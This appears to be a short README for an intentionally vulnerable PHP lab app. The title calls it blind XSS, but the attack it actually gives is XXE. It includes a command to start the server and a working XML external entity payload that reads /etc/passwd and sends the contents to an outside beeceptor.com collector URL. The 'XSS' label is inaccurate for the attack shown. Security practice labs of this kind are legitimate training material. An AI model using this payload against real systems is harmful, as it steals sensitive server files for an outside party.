# A web vulnerable to blind XSS

To run the server:
```
php -S 127.128.129.130:80
```

Navigate to Upload and try to upload file **student.xml** stored in folder **exploit**. You can rewrite URL to point to your own DTD, something like this:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://longnn.free.beeceptor.com/?x=%file;'>">
%eval;
%exfiltrate;
```

Then check the response and see the error messages. Something interesting to hacker will display ^^